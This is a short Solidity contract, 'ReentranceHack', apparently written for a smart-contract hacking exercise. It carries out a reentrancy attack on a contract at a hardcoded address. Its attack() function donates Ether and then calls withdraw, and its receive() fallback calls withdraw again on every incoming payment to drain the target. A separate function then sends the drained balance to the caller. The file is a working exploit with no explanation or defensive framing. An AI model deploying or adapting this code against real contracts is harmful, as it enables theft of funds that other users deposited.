// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

interface IReentrance {
    function donate(address) external payable;
    function withdraw(uint) external;
}

contract ReentranceHack {

    IReentrance public reentrance = IReentrance(0x5dDaC0eda308228eE2E7E0fDa641371Af40A3b8d);
    uint256 public stealEther = 1 ether;

    function attack() public payable {
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(stealEther);
    }

    function withdrawEther() public {
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success);
    }

    receive() external payable {
        reentrance.withdraw(stealEther);
    }
}